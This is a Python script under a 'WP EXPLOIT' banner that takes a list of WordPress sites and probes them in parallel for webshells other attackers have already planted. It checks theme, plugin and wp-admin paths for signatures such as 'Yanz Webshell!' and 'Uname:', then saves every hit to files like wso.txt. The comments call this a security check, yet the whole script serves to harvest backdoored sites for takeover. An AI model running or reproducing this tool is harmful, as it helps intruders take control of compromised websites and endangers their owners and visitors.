import sys
import os.path
import requests
import re
import urllib3
from requests.exceptions import SSLError
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore, init

# Initialize Colorama
init(autoreset=True)

# Define colors for use in output
error_color = Fore.RED
info_color = Fore.CYAN
success_color = Fore.GREEN
highlight_color = Fore.MAGENTA

# Disable warnings generated by urllib3
requests.urllib3.disable_warnings()

# Define HTTP request headers
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'Referer': 'www.google.com'
}

# Banner
banner_part1 = Fore.GREEN + """
██╗    ██╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
██║    ██║██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
██║ █╗ ██║██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
██║███╗██║██╔═══╝     ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
╚███╔███╔╝██║         ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
 ╚══╝╚══╝ ╚═╝         ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
"""

banner_part2 = Fore.MAGENTA + """
    join my Telegram channel: @BhinnekaSec
    
"""

# Display the entire banner with color separation
print(banner_part1 + banner_part2)

# Function to clean and get domain from URL
def URLdomain(url):
    if url.startswith("http://"):
        url = url.replace("http://", "")
    elif url.startswith("https://"):
        url = url.replace("https://", "")
    if '/' in url:
        url = url.split('/')[0]
    return url

# Security checks for various WordPress themes with updated logic
def check_security(url):
    fg = success_color  # For successful prints
    fr = error_color    # For failed prints
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url + '/wp-content/themes/travelscape/json.php', headers=headers, allow_redirects=True, timeout=15)
        if 'MSQ_403' in check.text:
            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
            open('MSQ_403.txt', 'a').write(url + '/wp-content/themes/travelscape/json.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/wp-content/themes/aahana/json.php', headers=headers, allow_redirects=True, verify=False, timeout=15)
            if 'MSQ_403' in check.text:
                print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
                open('MSQ_403.txt', 'a').write(url + '/wp-content/themes/aahana/json.php\n')
            else:
                print(' -| ' + url + ' --> {}[Failed]'.format(fr))
        check = requests.get(url + '/wp-content/themes/travel/issue.php', headers=headers, allow_redirects=True, timeout=15)
        if 'Yanz Webshell!' in check.text:
            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
            open('wso.txt', 'a').write(url + '/wp-content/themes/travel/issue.php\n')
        else:
            url = 'https://' + URLdomain(url)
        check = requests.get(url + '/about.php', headers=headers, allow_redirects=True, timeout=15)
        if 'Yanz Webshell!' in check.text:
            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
            open('wso.txt', 'a').write(url + '/about.php\n')
        else:
            url = 'https://' + URLdomain(url)
        check = requests.get(url + '/wp-content/themes/digital-download/new.php', headers=headers, allow_redirects=True, timeout=15)
        if '#0x2525' in check.text:
            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
            open('digital-download.txt', 'a').write(url + '/wp-content/themes/digital-download/new.php\n')
        else:
            print(' -| ' + url + ' --> {}[Failed]'.format(fr))
            url = 'http://' + URLdomain(url)
        check = requests.get(url + '/epinyins.php', headers=headers, allow_redirects=True, timeout=15)
        if 'Uname:' in check.text:
            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
            open('wso.txt', 'a').write(url + '/epinyins.php\n')
        else:
            print(' -| ' + url + ' --> {}[Failed]'.format(fr))
            url = 'https://' + URLdomain(url)
        check = requests.get(url + '/wp-admin/dropdown.php', headers=headers, allow_redirects=True, verify=False, timeout=15)
        if 'Uname:' in check.text:
            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
            open('wso.txt', 'a').write(url + '/wp-admin/dropdown.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url + '/wp-content/plugins/dummyyummy/wp-signup.php', headers=headers, allow_redirects=True, verify=False, timeout=15)
            if 'Simple Shell' in check.text:
                print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
                open('dummyyummy.txt', 'a').write(url + '/wp-content/plugins/dummyyummy/wp-signup.php\n')
            else:
                print(' -| ' + url + ' --> {}[Failed]'.format(fr))
    except Exception as e:
        print(f' -| {url} --> {fr}[Failed] due to: {e}')

# Main function and ThreadPool logic
def main():
    try:
        url_file_path = sys.argv[1]
    except IndexError:
        url_file_path = input(f"{info_color}Enter the path to the file containing URLs: ")
        if not os.path.isfile(url_file_path):
            print(f"{error_color}[ERROR] The specified file path is invalid.")
            sys.exit(1)

    try:
        urls_to_check = [line.strip() for line in open(url_file_path, 'r', encoding='utf-8').readlines()]
    except Exception as e:
        print(f"{error_color}[ERROR] An error occurred while reading the file: {e}")
        sys.exit(1)

    pool = ThreadPool(20)
    pool.map(check_security, urls_to_check)

    pool.close()
    pool.join()

    print(f"{info_color}Security check process completed successfully. Results are saved in corresponding files.")

if __name__ == "__main__":
    main()
